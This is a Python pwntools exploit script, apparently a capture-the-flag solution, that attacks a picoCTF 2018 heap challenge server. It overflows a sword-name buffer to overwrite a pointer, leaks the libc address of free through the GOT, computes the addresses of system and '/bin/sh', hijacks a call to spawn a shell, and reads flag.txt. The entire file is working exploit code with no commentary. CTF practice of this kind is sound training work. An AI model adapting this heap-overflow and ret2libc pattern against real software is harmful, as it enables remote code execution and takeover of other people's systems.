#!/usr/bin/env python2
from pwn import *
import struct
import string
FREE_GOT_PLT = 0x602018
FREE_LIBC = 0x844f0
SYSTEM_LIBC = 0x45390
BIN_SH_LIBC = 0x18cd57
def forgeSword(s):
	s.recvuntil("7. Quit.")
	s.sendline("1")
def hardenSword(s,index,length,name):
	s.recvuntil("7. Quit.")
	s.sendline("5")
	s.recvuntil("What's the index of the sword?")
	s.sendline(index)
	s.recvuntil("What's the length of the sword name?")
	s.sendline(length)
	s.recvuntil("Plz input the sword name.")
	s.sendline(name)
	s.recvuntil("What's the weight of the sword?")
	s.sendline("-1") # so we don't have to wait
def destroySword(s,index):
	s.recvuntil("7. Quit.")
	s.sendline("4")
	s.recvuntil("What's the index of the sword?")
	s.sendline(index)
def showSword(s,index):
	s.recvuntil("7. Quit.")
	s.sendline("3")
	s.sendline(index)
	s.recvuntil("The name is ")
	name = s.recvline()
	return name
def equipSword(s,index):
	s.recvuntil("7. Quit.")
	s.sendline("6")
	s.recvuntil("What's the index of the sword?")
	s.sendline(index)

r = remote("2018shell.picoctf.com",32987)
forgeSword(r)
hardenSword(r,"0","255","A"*(4*14)+struct.pack("<Q",FREE_GOT_PLT))
destroySword(r,"0")
forgeSword(r)
forgeSword(r)
forgeSword(r)
addr = showSword(r,"2")
free_libc = struct.unpack("<Q",addr[:6]+"\x00"*2)[0]
print("free: 0x%x"%free_libc)
base_libc = free_libc-FREE_LIBC
system_libc = base_libc+SYSTEM_LIBC
bin_sh = base_libc+BIN_SH_LIBC
print("system: 0x%x"%system_libc)
print("'/bin/sh': 0x%x"%bin_sh)
forgeSword(r)
hardenSword(r,"3","255","A"*(4*14)+struct.pack("<Q",bin_sh)+struct.pack("<Q",system_libc))
destroySword(r,"3")
forgeSword(r)
forgeSword(r)
forgeSword(r)
equipSword(r,"5")
r.sendline("cat flag.txt")
r.interactive()